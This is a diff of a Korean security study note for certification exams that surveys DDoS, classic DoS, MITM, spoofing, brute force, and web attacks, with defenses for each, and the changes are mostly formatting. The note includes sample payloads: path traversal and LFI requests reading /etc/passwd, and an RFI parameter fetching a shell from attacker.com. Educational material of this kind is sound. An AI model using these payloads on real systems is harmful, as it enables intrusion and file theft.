@@ -1,8 +1,8 @@
 ---
-title: Attack Types and Mitigation
-tags: [security, attack, ddos, mitm, spoofing, cyber-attack]
-aliases: [공격 유형, DDoS, MITM, Spoofing]
-date modified: 2025-12-20 00:17:40 +09:00
+title: attack-types
+tags: [attack, cyber-attack, ddos, mitm, security, spoofing]
+aliases: [DDoS, MITM, Spoofing, 공격 유형]
+date modified: 2026-04-05 17:47:10 +09:00
 date created: 2025-12-20 00:17:40 +09:00
 ---
 
@@ -17,12 +17,14 @@ date created: 2025-12-20 00:17:40 +09:00
 #### 1. Volumetric Attacks (대역폭 소진)
 
 **UDP Flood**:
+
 ```
 공격자 → 다수 Bot → 대량 UDP 패킷 → 피해자
                       (100+ Gbps)
 ```
 
 **DNS Amplification**:
+
 ```
 1. 공격자: DNS 쿼리 전송 (Source IP 위조)
 2. DNS 서버: 큰 응답 (50배 증폭)
@@ -30,13 +32,15 @@ date created: 2025-12-20 00:17:40 +09:00
 ```
 
 **증폭 비율**:
-- DNS: 28~54배
-- NTP: 556배
-- Memcached: 51,000배 (!)
+
+- DNS: 28~54 배
+- NTP: 556 배
+- Memcached: 51,000 배 (!)
 
 #### 2. Protocol Attacks (프로토콜 취약점)
 
 **SYN Flood**:
+
 ```mermaid
 sequenceDiagram
     participant A as 공격자(Bots)
@@ -54,6 +58,7 @@ sequenceDiagram
 #### 3. Application Layer Attacks (L7)
 
 **HTTP Flood**:
+
 ```
 GET / HTTP/1.1
 Host: target.com
@@ -61,6 +66,7 @@ Host: target.com
 ```
 
 **Slowloris**:
+
 ```http
 GET / HTTP/1.1
 Host: target.com
@@ -81,6 +87,7 @@ graph TB
 ```
 
 **방어 기법**:
+
 - CDN 및 Anycast
 - Rate Limiting
 - Challenge-Response (CAPTCHA)
@@ -89,12 +96,13 @@ graph TB
 
 ### 📚 고전 DoS 공격 (Legacy - 시험 대비용)
 
-> [!NOTE]
-> 아래 공격들은 **고전적인 DoS 공격**으로, 현대 네트워크 환경에서는 대부분 **방어 메커니즘이 구축**되어 실질적 위협이 크게 감소했습니다. 그러나 **정보보안 자격시험**에는 여전히 출제되므로 개념 이해가 필요합니다.
+>[!NOTE]
+>아래 공격들은 **고전적인 DoS 공격**으로, 현대 네트워크 환경에서는 대부분 **방어 메커니즘이 구축**되어 실질적 위협이 크게 감소했습니다. 그러나 **정보보안 자격시험**에는 여전히 출제되므로 개념 이해가 필요합니다.
 
 #### Smurf Attack (ICMP Flood)
 
 **공격 메커니즘**:
+
 ```
 1. 공격자: ICMP Echo Request (Source IP = 피해자 IP 위조)
 2. 전송 대상: 브로드캐스트 주소 (예: 192.168.1.255)
@@ -119,6 +127,7 @@ graph LR
 ```
 
 **방어**:
+
 - 라우터에서 directed broadcast 비활성화 (`no ip directed-broadcast`)
 - ICMP Echo 요청 필터링
 - **현대 환경**: 기본적으로 차단되어 있음
@@ -130,6 +139,7 @@ graph LR
 #### Land Attack
 
 **공격 메커니즘**:
+
 ```
 특수 TCP SYN 패킷 전송:
 Source IP = Destination IP = 피해자 IP
@@ -140,6 +150,7 @@ Source Port = Destination Port = 동일
 ```
 
 **패킷 구조**:
+
 ```
 TCP SYN Packet:
 Source IP: 192.168.1.100
@@ -149,11 +160,13 @@ Dest Port:   80            (동일!)
 ```
 
 **영향**:
+
 - 구형 OS (Windows 95/NT, 초기 Linux 커널)에서 시스템 크래시
 - 무한 루프로 CPU 점유
 
 **방어**:
-- 방화벽/IDS에서 Source = Dest 패킷 차단
+
+- 방화벽/IDS 에서 Source = Dest 패킷 차단
 - 현대 OS 커널에 패치 적용됨
 
 **현재 상태**: ⚠️ 현대 시스템에서 영향 없음 (커널 패치 완료)
@@ -163,6 +176,7 @@ Dest Port:   80            (동일!)
 #### Teardrop Attack (IP Fragment Overlap)
 
 **공격 메커니즘**:
+
 ```
 조작된 IP 조각(fragment) 패킷 전송:
 
@@ -179,12 +193,14 @@ Dest Port:   80            (동일!)
 ```
 
 **영향**:
+
 - 구형 OS (Windows 3.1x, NT 4.0, Linux 2.0.x)에서 블루스크린/커널 패닉
 - IP 재조립 코드의 취약점 악용
 
 **방어**:
+
 - 방화벽에서 중첩된 fragment 탐지 및 차단
-- OS 패치 (모든 현대 OS에 수정됨)
+- OS 패치 (모든 현대 OS 에 수정됨)
 
 **현재 상태**: ⚠️ 역사적 공격 (현대 시스템 영향 없음)
 
@@ -198,8 +214,8 @@ Dest Port:   80            (동일!)
 | **Land** | Source=Dest 무한루프 | 패치 완료 | ⭐⭐ |
 | **Teardrop** | Fragment 중첩 | 패치 완료 | ⭐⭐ |
 
-> [!TIP]
-> **시험 대비**: 공격 원리와 이름만 기억하면 충분합니다. 실무에서는 현대적인 DDoS 공격 (SYN Flood, HTTP Flood, DNS Amplification)에 집중하세요.
+>[!TIP]
+>**시험 대비**: 공격 원리와 이름만 기억하면 충분합니다. 실무에서는 현대적인 DDoS 공격 (SYN Flood, HTTP Flood, DNS Amplification)에 집중하세요.
 
 ## 🎭 MITM (Man-in-the-Middle)
 
@@ -229,6 +245,7 @@ Attacker → Gateway: "희생자 IP의 MAC은 내 MAC"
 ```
 
 **탐지**:
+
 ```bash
 # ARP 테이블 모니터링
 arp -a | watch
@@ -238,6 +255,7 @@ sudo arpwatch -i eth0
 ```
 
 **방어**:
+
 - 정적 ARP 엔트리
 - Dynamic ARP Inspection (스위치 기능)
 - [[network-security-protocols|TLS/SSL]] 사용
@@ -266,6 +284,7 @@ From: 192.168.1.100 (실제: 1.2.3.4)
 ```
 
 **방어**:
+
 - Ingress/Egress 필터링 (BCP 38)
 - 안티스푸핑 ACL
 
@@ -285,6 +304,7 @@ sequenceDiagram
 ```
 
 **방어**:
+
 - [[dns-fundamentals|DNSSEC]]
 - DNS over HTTPS/TLS
 
@@ -363,7 +383,8 @@ for password in all_combinations:
 ```
 
 **방어**:
-- 계정 잠금 (5회 실패 시)
+
+- 계정 잠금 (5 회 실패 시)
 - CAPTCHA
 - Rate Limiting
 
@@ -383,6 +404,7 @@ MD5("password") = 5f4dcc3b5aa765d61d8327deb882cf99
 ```
 
 **방어**: Salt 사용
+
 ```python
 hash(password + random_salt)
 ```
@@ -396,6 +418,7 @@ GET /download?file=../../../../etc/passwd HTTP/1.1
 ```
 
 **방어**:
+
 - 입력 검증
 - 경로 정규화
 - chroot jail
@@ -403,12 +426,14 @@ GET /download?file=../../../../etc/passwd HTTP/1.1
 ### File Inclusion
 
 **LFI (Local)**:
+
 ```php
 <?php include($_GET['page']); ?>
 // ?page=../../etc/passwd
 ```
 
 **RFI (Remote)**:
+
 ```php
 // ?page=http://attacker.com/shell.php
 ```
